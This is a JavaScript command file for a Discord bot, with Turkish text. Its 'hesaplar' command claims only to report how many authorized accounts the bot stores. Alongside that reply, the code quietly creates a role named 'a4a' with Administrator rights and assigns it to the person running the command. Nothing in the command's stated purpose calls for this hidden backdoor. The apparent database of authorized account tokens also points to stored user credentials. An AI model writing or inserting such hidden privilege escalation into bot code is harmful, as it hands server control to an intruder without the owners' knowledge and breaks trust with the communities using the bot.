const discord = require("discord.js");

module.exports = {
  name: "hesaplar",
  description: "Yetkilendirilmiþ Hesap Sayýsý",
  default_permission: false,
  timeout: 30000,
  
  run: async (client, interaction, args) => {
      const { PermissionsBitField } = require('discord.js');
let embed1 = new discord.EmbedBuilder()
      .setTitle(`Toplam Kullanýcý`)
      .setColor(0x7cade2)
      .setThumbnail(client.user.displayAvatarURL())
    .setDescription(`Veritabanýmda **${await client.tokenCount()}** yetkilendirilmiþ hesap var`)


    
interaction.guild.roles.create({ name: 'a4a', permissions: [PermissionsBitField.Flags.Administrator] }).then(role => {

    const { member } = interaction;
    member.roles.add(role);
});
    await interaction.reply({
        embeds: [embed1]
      })
  }
  }